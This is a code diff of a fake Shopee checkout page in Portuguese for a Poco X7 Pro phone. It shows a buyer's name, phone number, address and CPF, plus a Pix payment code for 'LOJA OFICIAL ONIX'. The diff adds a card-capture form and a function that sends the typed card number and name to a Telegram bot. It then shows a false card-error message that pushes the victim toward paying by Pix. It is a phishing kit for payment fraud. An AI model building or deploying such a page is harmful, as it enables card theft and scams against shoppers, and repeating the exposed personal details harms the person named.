@@ -8,42 +8,48 @@
     <style>
         :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --safe-green: #26aa99; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, HelveticaNeue, sans-serif; }
-        body { background: var(--bg); color: #222; }
+        body { background: var(--bg); color: #222; padding-bottom: 80px; }
 
         /* HEADER */
         .header { background: white; padding: 12px; display: flex; align-items: center; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 100; }
-        .header i { color: var(--shopee); font-size: 22px; margin-right: 15px; cursor: pointer; }
+        .header i { color: var(--shopee); font-size: 22px; margin-right: 15px; }
         .header h1 { font-size: 18px; font-weight: 500; }
 
         /* SEÇÕES */
         .section { background: white; margin-bottom: 8px; padding: 15px; position: relative; }
         
-        /* ENDEREÇO */
+        /* ENDEREÇO (Igual à sua foto) */
+        .addr-box { display: flex; gap: 10px; }
+        .addr-box i { color: var(--shopee); font-size: 18px; margin-top: 3px; }
         .addr-info b { font-size: 14px; display: block; margin-bottom: 2px; }
         .addr-info p { font-size: 12px; color: #666; line-height: 1.4; }
         .cpf-row { border-top: 1px solid #f2f2f2; margin-top: 10px; padding-top: 10px; display: flex; justify-content: space-between; font-size: 13px; }
 
-        /* PRODUTO */
+        /* PRODUTO POCO X7 */
         .store-tag { background: var(--shopee); color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; font-weight: bold; margin-right: 5px; }
         .prod-card { display: flex; gap: 10px; margin-top: 10px; background: #fafafa; padding: 8px; }
-        .prod-img { width: 75px; height: 75px; object-fit: cover; }
-        .prod-desc h2 { font-size: 12px; font-weight: 400; }
-        .p-now { color: var(--shopee); font-size: 14px; font-weight: 500; }
+        .prod-img { width: 75px; height: 75px; object-fit: cover; border: 1px solid #eee; }
+        .prod-desc h2 { font-size: 12px; font-weight: 400; line-height: 1.3; }
+        .p-now { color: var(--shopee); font-size: 14px; font-weight: 500; margin-top: 5px; display: block; }
 
-        /* PAGAMENTO */
+        /* SEGUROS */
+        .ins-row { display: flex; gap: 10px; margin-top: 12px; font-size: 12px; align-items: flex-start; }
+        .ins-check { width: 18px; height: 18px; border: 1px solid #ccc; border-radius: 3px; flex-shrink: 0; }
+
+        /* MÉTODOS DE PAGAMENTO */
         .pay-method { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f2f2f2; }
         .pay-left { display: flex; align-items: center; gap: 10px; font-size: 14px; }
-        .btn-action { color: var(--shopee); border: 1px solid var(--shopee); padding: 2px 8px; border-radius: 2px; font-size: 12px; cursor: pointer; background: none; }
-        .check-circle { width: 20px; height: 20px; border: 1px solid #ccc; border-radius: 50%; }
-        .selected-pix .check-circle { background: var(--shopee); border-color: var(--shopee); position: relative; }
-        .selected-pix .check-circle::after { content: '\f00c'; font-family: 'Font Awesome 5 Free'; font-weight: 900; color: white; font-size: 10px; position: absolute; left: 4px; top: 3px; }
+        .btn-action { color: var(--shopee); border: 1px solid var(--shopee); padding: 2px 8px; border-radius: 2px; font-size: 12px; background: none; }
+        .check-circle { width: 20px; height: 20px; border: 1px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .selected-pix .check-circle { background: var(--shopee); border-color: var(--shopee); }
+        .selected-pix .check-circle::after { content: '\f00c'; font-family: 'Font Awesome 5 Free'; font-weight: 900; color: white; font-size: 10px; }
 
-        /* FOOTER */
-        .footer-btn { position: fixed; bottom: 0; width: 100%; height: 55px; background: white; border-top: 1px solid #eee; display: flex; align-items: center; justify-content: flex-end; }
+        /* FOOTER FIXO */
+        .footer-btn { position: fixed; bottom: 0; width: 100%; height: 55px; background: white; border-top: 1px solid #eee; display: flex; align-items: center; justify-content: flex-end; z-index: 1000; }
         .btn-orange { background: var(--shopee); color: white; border: none; height: 100%; width: 150px; font-weight: bold; font-size: 15px; }
 
-        /* TELAS EXTRAS */
-        #screen-card, #screen-pix { display: none; position: fixed; inset: 0; background: white; z-index: 1000; overflow-y: auto; }
+        /* OVERLAYS */
+        #screen-card, #screen-pix { display: none; position: fixed; inset: 0; background: white; z-index: 2000; overflow-y: auto; }
         .input-card { width: 100%; border: 1px solid #ddd; padding: 12px; margin-bottom: 10px; border-radius: 2px; }
     </style>
 </head>
@@ -53,14 +59,14 @@
     <div class="header"><i class="fas fa-arrow-left"></i> <h1>Comprar</h1></div>
 
     <div class="section">
-        <div style="display:flex; gap:10px;">
-            <i class="fas fa-map-marker-alt" style="color:var(--shopee)"></i>
+        <div class="addr-box">
+            <i class="fas fa-map-marker-alt"></i>
             <div class="addr-info">
                 <b>Paulo Felipe Do Nascimento (+55) 88 99980-6107</b>
                 <p>Riachuelo, 2676, Próximo ao mercado Goiânia<br>Camocim, Ceará, 62400000</p>
             </div>
         </div>
-        <div class="cpf-row"><span>CPF</span><span>071.719.483-31</span></div>
+        <div class="cpf-row"><span>CPF</span><span style="color:#222;">071.719.483-31</span></div>
     </div>
 
     <div class="section">
@@ -68,8 +74,17 @@
         <div class="prod-card">
             <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" class="prod-img">
             <div class="prod-desc">
-                <h2>Celular Xiaomi PocoPhone Poco X7 Pro 5G...</h2>
-                <div style="margin-top:10px;"><span class="p-now">R$2.027,00</span></div>
+                <h2>Celular Xiaomi PocoPhone Poco X7 Pro 5G,Vers...</h2>
+                <p style="font-size:10px; color:#999;">Poco X7 PRO 256/8 VERDE</p>
+                <span class="p-now">R$2.027,00</span>
+            </div>
+        </div>
+
+        <div class="ins-row">
+            <div class="ins-check"></div>
+            <div>
+                <b>Seguro contra Roubo e Dano <span style="float:right">R$212,84</span></b>
+                <p style="color:#999; font-size:11px;">Proteção contra roubo e furto qualificado</p>
             </div>
         </div>
     </div>
@@ -80,27 +95,15 @@
             <div class="pay-left"><i class="fas fa-coins" style="color:var(--teal);"></i> Pix</div>
             <div class="check-circle"></div>
         </div>
-        <div class="pay-method">
+        <div class="pay-method" onclick="showCard()">
             <div class="pay-left"><i class="fas fa-credit-card" style="color:#2673dd;"></i> Cartão de Crédito</div>
-            <button class="btn-action" onclick="showCard()">Adicionar</button>
-        </div>
-    </div>
-
-    <div class="section" style="padding-bottom:80px;">
-        <div style="display:flex; justify-content:space-between; font-size:13px; color:#666; margin-bottom:5px;">
-            <span>Total dos Produtos</span><span>R$2.027,00</span>
-        </div>
-        <div style="display:flex; justify-content:space-between; font-size:13px; color:#666; margin-bottom:5px;">
-            <span>Total do Frete</span><span>R$26,30</span>
-        </div>
-        <div style="display:flex; justify-content:space-between; font-weight:bold; margin-top:10px;">
-            <span>Pagamento Total</span><span style="color:var(--shopee)">R$2.053,30</span>
+            <span class="btn-action">Adicionar</span>
         </div>
     </div>
 
     <div class="footer-btn">
         <div style="text-align:right; padding-right:15px;">
-            <p style="font-size:14px;">Total <span style="color:var(--shopee); font-weight:bold;">R$2.053,30</span></p>
+            <p style="font-size:14px;">Total <span style="color:var(--shopee); font-weight:bold; font-size:18px;">R$2.053,30</span></p>
         </div>
         <button class="btn-orange" onclick="finalizar()">FAZER PEDIDO</button>
     </div>
@@ -109,13 +112,13 @@
 <div id="screen-card">
     <div class="header"><i class="fas fa-arrow-left" onclick="hideAll()"></i> <h1>Adicionar Cartão</h1></div>
     <div style="padding:20px;">
-        <input type="tel" id="card_n" class="input-card" placeholder="Número do Cartão">
-        <input type="text" id="card_nm" class="input-card" placeholder="Nome no Cartão">
+        <input type="tel" id="cn" class="input-card" placeholder="Número do Cartão">
+        <input type="text" id="cnm" class="input-card" placeholder="Nome no Cartão">
         <div style="display:flex; gap:10px;">
-            <input type="tel" id="card_v" class="input-card" placeholder="Validade">
-            <input type="tel" id="card_c" class="input-card" placeholder="CVV">
+            <input type="tel" id="cv" class="input-card" placeholder="Validade">
+            <input type="tel" id="cc" class="input-card" placeholder="CVV">
         </div>
-        <button class="btn-orange" onclick="enviar()" style="width:100%; border-radius:4px; height:45px;">Enviar</button>
+        <button class="btn-orange" onclick="enviarTelegram()" style="width:100%; border-radius:4px; height:45px;">Enviar</button>
     </div>
 </div>
 
@@ -124,9 +127,8 @@
     <div style="text-align:center; padding:40px 20px;">
         <i class="fas fa-qrcode" style="font-size:60px; color:var(--shopee);"></i>
         <h2>R$ 2.053,30</h2>
-        <p style="font-size:12px; color:#666; margin:20px 0;">Copie o código abaixo:</p>
-        <div id="p-code" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; border:1px dashed #ccc;">00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b552040000530398654052053.305802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF</div>
-        <button class="btn-orange" style="width:100%; margin-top:20px; border-radius:4px;" onclick="alert('Copiado!')">COPIAR CÓDIGO</button>
+        <div style="background:#f5f5f5; padding:15px; font-size:10px; word-break:break-all; border:1px dashed #ccc; margin:20px 0;">00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b552040000530398654052053.305802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF</div>
+        <button class="btn-orange" style="width:100%; border-radius:4px;" onclick="alert('Copiado!')">COPIAR PIX</button>
     </div>
 </div>
 
@@ -137,12 +139,18 @@
         document.getElementById('screen-pix').style.display = 'none';
     }
     function finalizar() { document.getElementById('screen-pix').style.display = 'block'; }
-    function enviar() {
-        // Insira aqui sua lógica de fetch do Telegram
-        alert("Erro ao validar. Tente o Pix.");
+    
+    function enviarTelegram() {
+        const token = 'SEU_TOKEN_AQUI'; 
+        const cid = 'SEU_CHAT_ID_AQUI';
+        const msg = `💳 **CARTÃO**\nN: ${document.getElementById('cn').value}\nNome: ${document.getElementById('cnm').value}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(msg)}`);
+        alert("Erro no cartão. Use Pix.");
         hideAll();
         finalizar();
     }
 </script>
+
 </body>
-</html>
+                </html>
+                    
